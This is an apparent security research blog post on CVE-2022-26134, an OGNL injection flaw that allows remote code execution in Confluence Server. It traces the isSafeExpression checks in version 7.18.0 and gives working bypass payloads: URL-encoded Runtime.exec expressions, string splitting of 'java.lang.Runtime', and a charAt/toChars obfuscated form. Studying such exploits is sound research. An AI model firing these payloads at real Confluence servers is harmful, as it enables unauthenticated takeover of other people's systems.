---
layout: post
title:  "CVE-2022-26134: A look into bypass isSafeExpression check in Confluence Preauth RCE"
date:   2022-06-06 16:00:00 +0700
categories: research
author: Quang Vo
tags: 0day, cve-2022-26134
description: Research analysis and develop a working exploit poc script 
---

## Reference
- [https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass](https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass)
- [https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
- [@MCKSysAr](https://twitter.com/MCKSysAr)

## 1. Introduction & Environment setup

CVE-2022-26134 is an Preauth RCE ( OGNL injection vulnerability ) in Confluence Server. As there are a lot of technical analysis and payload about the vulnerability already, while the payload works on most of confluence server versions, but it won't work in Confluence server version 7.18.0 because the dev team has added some additional check for safe expression. So in this post, I will focus on the bypass `isSafeExpression` of Confluence version 7.18.0.

For environment setup, I download Confluence server version 7.18.0 on: [https://www.atlassian.com/software/confluence/download-archives](https://www.atlassian.com/software/confluence/download-archives)

For Postgres database, I use docker to quickly spin up the postgresdb:
```text
version: '3.4'
services:
        db:
                image: postgres:latest
                environment:
                        - POSTGRES_PASSWORD=postgres
                        - POSTGRES_DB=confluence
                        - POSTGRES_USER=postgres
                ports:
                        - 5432:5432
```

## 2. Technical Analysis of how the isSafeExpression works

Rapid7 Team did a great job on publishing the [blog post](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) and the exploit payload, here's the payload that I copied from their blog

```java
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
```

But when I try that payload on Confluence version 7.18.0, it didn't work. So I add remote debugger to add breakpoints to see what is the difference between their version and mine.


Based on security advisories from Confluence, I download the `xwork-1.0.3-atlassian-10.jar` from their website and start to diffing patches, it's easy to identify  `ActionChainResult.class`  is where our vulnerability lies at.

![image](https://user-images.githubusercontent.com/37280106/172528678-4bed14c4-bc8d-4809-99ae-1c49d86fa9c2.png)

How an attacker provided URI can cause the vulnerability is well-explained and mentioned in this [blog post](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) ( you can go to their blog if you curious about the call stack to reach to our vulnerable code ), I just want to quickly note that because of this piece of code:

```java
public static String getNamespaceFromServletPath(String servletPath) {
    servletPath = servletPath.substring(0, servletPath.lastIndexOf("/"));
    return servletPath;
}
```

Every payload that you send must end with `/` , otherwise it won't reach the vulnerable code path. I learned that from my own experience after trying to figure it out why the breakpoint won't hit when I send the payload 

Our call stack to vulnerable code so far:
```
TextParseUtil.translateVariables(this.namespace, stack);
        OgnlValueStack.findValue
```

Content of `OgnlValueStack.findValue`
![image](https://user-images.githubusercontent.com/37280106/172530117-33346b6c-7804-483a-ae1f-1dfdcc2eaee6.png)

Here we see that there is an additional check `this.safeExpressionUtil.isSafeExpression(expr)` ,  which will eventually leads to `SafeExpressionUtil.isSafeExpressionInternal`

Content of `SafeExpressionUtil.isSafeExpressionInternal` , let's put a breakpoint at this function and send our payload to see what will happen
![image](https://user-images.githubusercontent.com/37280106/172530562-d25f5861-49b6-4de8-b4e7-35719025496f.png)

Here I use the simple payload to hit the breakpoint in our code: 
```
%24%7b%22%22%20%2b%20Class.forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2c%20null).invoke(null%2cnull).exec(%22gnome-calculator%22)%7d%7d/
```
![image](https://user-images.githubusercontent.com/37280106/172531464-cc30aea6-b81a-45c1-af0c-113494a2348e.png)

Here we will go through the first check, `isUnsafeClass(expr)` 

```java
    private boolean isUnSafeClass(String expression) {
        String trimmedClassName = this.trimQuotes(expression);
        if (this.unsafePropertyNames.contains(trimmedClassName)) {
            return true;
        } else if (SourceVersion.isName(trimmedClassName)) {
            List<String> parentPackageNames = this.populateParentPackages(trimmedClassName, new ArrayList());
            Stream var10000 = parentPackageNames.stream();
            Set var10001 = this.unsafePackageNames;
            var10001.getClass();
            return var10000.anyMatch(var10001::contains);
        } else {
            return false;
        }
    }
```
Where `this.unsafePropertyNames` is a `HashSet` includes:
![image](https://user-images.githubusercontent.com/37280106/172532694-065d5872-2a97-46fc-b260-ef3be1f2bb19.png)

Here we have a blacklist of forbidden property names, luckily our `trimmedClassName` variable is a long expression string **still** and not contains in the hashset so we can pass this check. Please keep in mind this list because it will be very important as we go along in our debug journey 

Follow our code flow, we hit another check `this.containsUnsafeExpression(parsedExpression, visitedExpression)`
![image](https://user-images.githubusercontent.com/37280106/172533345-09b239d4-90b3-4261-9495-317a5235613b.png)

Content of `this.containsUnsafeExpression` 

![image](https://user-images.githubusercontent.com/37280106/172533604-fd1fc44d-143d-4444-8100-353e85540adb.png)

At a high-level overview of this function, it checks for "unsafe" expression by:
- Have a allowed whitelist of classNames, methodNames, variableNames and properties
- Utilies AST parsing to check for unsafe node types
- In the for loop, it extracting the `childNode` one by one and then call the `containsUnsafeExpression` to perform the check again

`UNSAFE_NODE_TYPES` is a `HashSet` includes:

![image](https://user-images.githubusercontent.com/37280106/172555031-7416d072-ac8e-4132-81e7-1ae3ff028e8b.png)

Going back to the beginning of our blog, I mentioned the payload 
```java
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
```

That works fine for other versions, but not 7.18.0 with this `containsUnsafeExpression` check, let's try to send that payload and see what happens:

![image](https://user-images.githubusercontent.com/37280106/172557725-2c964070-c4c5-44cd-99cf-3e431adff3ed.png)
As you can see, after our expression string is parsed into a OGNL Node, it has 3 childrens:
```
ASTAssign: #a = @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(), "utf-8")
ASTStaticMethod: @com.opensymphony.webwork.ServletActionContext@getResponse()
ASTMethod: setHeader("X-Cmd-Response", #a)
```

You can guess why it doesn't work, because `ASTAssign` is in `UNSAFE_NODE_TYPES` so `containsUnsafeExpression` return true and we cannot get our expression evaluated 

Going back to our payload that we sent in the beginning:
```
%24%7b%22%22%20%2b%20Class.forName(%22java.%22%20%2b%20%22lang.Runtime%22).getMethod(%22getRuntime%22%2c%20null).invoke(null%2cnull).exec(%22gnome-calculator%22)%7d%7d/
```

After the first loop, we end up in with `i=1` with our current values:

![image](https://user-images.githubusercontent.com/37280106/172659455-e6d99a9b-3c46-4712-87bf-207833c3d02b.png)

We are calling `this.containsUnsafeExpression(childNode, visitedExpressions)` where:
```
childNode: forName("java.lang.Runtime")
```

In the next `containsUnsafeExpression` 's loop, we got this value
![image](https://user-images.githubusercontent.com/37280106/172665189-68357b0b-e670-4dba-a585-39dc1d85720b.png)

Here we are calling `containsUnsafeExpression` again, with values:
```
childNode: java.lang.Runtime
```

![image](https://user-images.githubusercontent.com/37280106/172667092-8540bce3-68f5-4d65-96f9-4adc8ac484a1.png)

In this call, our node type is `ASTConst`, so in this line of code:
```
String nodeClassName = node.getClass().getName(); 

=> nodeClassName will be ognl.ASTConst
```

Follow the code flow of function `containsUnsafeExpression`, in line 117, we will move to this `else if block`;
```java
else if ("ognl.ASTConst".equals(nodeClassName) && !this.isSafeConstantExpressionNode(node, visitedExpressions)) {
       return true;
 }
```

Content of `this.isSafeConstantExpressionNode`:
```java
private boolean isSafeConstantExpressionNode(Node node, Set<String> visitedExpressions) {
        try {
            String value = node.getValue(new OgnlContext(), (Object)null).toString();
            if (!visitedExpressions.contains(value) && value != null && !value.isEmpty()) {
                visitedExpressions.add(value);
                return this.isSafeExpressionInternal(value, visitedExpressions);
            } else {
                return true;
            }
        } catch (OgnlException var4) {
            log.debug("Cannot verify safety of OGNL expression", var4);
            return true;
        }
    }
```

In `this.isSafeConstantExpressionNode` , it will call `this.isSafeExpressionInternal(value, visitedExpression)` where:
- `value: java.lang.Runtime`
- `visitedExpression<Hashset>: {"java.lang.Runtime", "Class"}` 

Finally, we are reaching the important piece of code, where our payload fails:

![image](https://user-images.githubusercontent.com/37280106/172668596-47cae55b-cd35-49cb-b193-03a274367aef.png)

It will call to `isUnsafeClass` method to check if the expression is in the blacklisted property names or not.
```java
if (this.unsafePropertyNames.contains(trimmedClassName)) {
            return true;
....
```

You can look back where I mentioned what `this.unsafePropertyNames` included, and our `java.lang.Runtime` is in the blacklisted, so the `this.isUnsafeClass` return true => Our expression is not evaluated


## 3. Bypassing isSafeExpression check

So our expression need to be not in the `UNSAFE_NODE_TYPES` first, and then we have to make our expression pass all the check after `&&` in the else if conditions.

Back to this payload:
```java
${"" + Class.forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null,null).exec("gnome-calculator")}}
```

We have passed the AST parser checks, we just hit a final block stone is `isUnsafeClass` check. Our OGNL Expression was blocked because in this for loop:
```java
for(int i = 0; i < node.jjtGetNumChildren(); ++i) {
                Node childNode = node.jjtGetChild(i);
                if (childNode != null && this.containsUnsafeExpression(childNode, visitedExpressions)) {
                    return true;
                }
 }
```

After a few loops, our expression broke down to smaller and smaller string ( here is `childNode` )
```
i = 0
node = Class
childNode = forName("java.lang.Runtime")
---------------
i = 1
node = forName("java.lang.Runtime")
childNode = java.lang.Runtime
----------
i = 2
node = java.lang.Runtime => this is where we failed when this function is called this.isUnSafeClass(node.toString())
```

Knowing that our string will be broken down into smaller and smaller string like demonstrated above, what if we break our payload to smaller pieces too ?. Will that trick the parser ?

We know that:
```java
 System.out.println(Class.forName("java." + "lang.Runtime"));
 
 output: class java.lang.Runtime
```
The idea is, we will use this string `"java." + "lang.Runtime"` to trick the parser to parse it into 2 different nodes: `java.` and `lang.Runtime`, so when the `this.unsafePropertyNames.contains(nodeClassName)` is called, we will be able to bypass it as those node's names are not in the Hashset

Now we have to find out does `Ognl.parseExpression()` or `Ognl.getValue()` perform string concatnation or not 

![image](https://user-images.githubusercontent.com/37280106/173008154-e621ac91-8759-4e21-9f75-374fb6cebf3b.png)

`Ognl.parseExpression()` return Object, no string concatnation is performed during the function call. How about `Ognl.getValue()` ? 

![image](https://user-images.githubusercontent.com/37280106/173008452-d600b8ee-574c-421b-83be-464e045529bb.png)

```
java.lang.IllegalAccessException: Method [public java.lang.Process java.lang.Runtime.exec(java.lang.String) throws java.io.IOException] cannot be called from within OGNL invokeMethod() under stricter invocation mode
```
Even though we got errors, but the most important thing is, `Ognl.getValue()` did concat our string and then invoke it.

It's time to try on Confluence server 7.18.0 :)

First loop, `i=0`
![image](https://user-images.githubusercontent.com/37280106/173010790-4721db5a-8309-4793-8706-f97fdb40fd56.png)

`i=1`
![image](https://user-images.githubusercontent.com/37280106/173010950-9682d2be-44ca-4eb3-9c6e-dc336e2e2e87.png)


As you can see, we've successfully bypassed the `this.unsafePropertyNames()` check :)

![image](https://user-images.githubusercontent.com/37280106/173011921-5bf140f7-57bb-4e85-9f02-53018dc9a2fb.png)

### Just another payload that bypass isSafeExpression check
The payload above is much simpler than the one I'm about to introduce, but they are all based on the same idea - using OGNL to build the string/payload that we need to bypass the blacklist/whitelist

We can start our payload with this:
```java
${true.toString().charAt(0).toChars(67)[0].toString()} 
output: C
```

- `true.toString()` = `""`
- `charAt(0)` => return character at index 0
- `toChars(67)[0]` converts the supplied character code point to a character representation and stores it in a char array

Then from there, we can build up our payload `java.lang.Runtime` like this:
```java
true.toString().charAt(0).toChars(106)[0].toString().concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(118)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(108)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(103)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(82)[0].toString()).concat(true.toString().charAt(0).toChars(117)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(116)[0].toString()).concat(true.toString().charAt(0).toChars(105)[0].toString()).concat(true.toString().charAt(0).toChars(109)[0].toString()).concat(true.toString().charAt(0).toChars(101)[0].toString())
```

Here we pop calc again once again with a different way to bypass ;)
![image](https://user-images.githubusercontent.com/37280106/173097800-94497909-b4d2-4c40-838e-f328956d4a10.png)

More on how to automatically generate this payload, you can see more [here](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
